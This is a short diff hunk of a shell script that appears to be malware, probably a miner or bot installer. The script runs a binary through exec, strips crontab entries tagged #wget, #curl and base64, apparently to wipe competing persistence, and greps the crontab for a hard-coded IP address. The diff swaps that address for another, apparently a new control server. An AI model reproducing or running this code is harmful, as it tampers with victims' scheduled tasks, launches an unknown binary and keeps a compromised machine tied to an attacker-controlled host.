@@ -672,7 +672,7 @@ SKL=d $BIN_FULL_PATH
 exec $SKL
 crontab -l | sed '/#wget/d' | crontab -
 crontab -l | sed '/#curl/d' | crontab -
-crontab -l | grep -e "195.3.146.118" | grep -v grep
+crontab -l | grep -e "195.3.146.251" | grep -v grep
 
 exec $BIN_NAME;
 crontab -l | sed '/base64/d' | crontab -
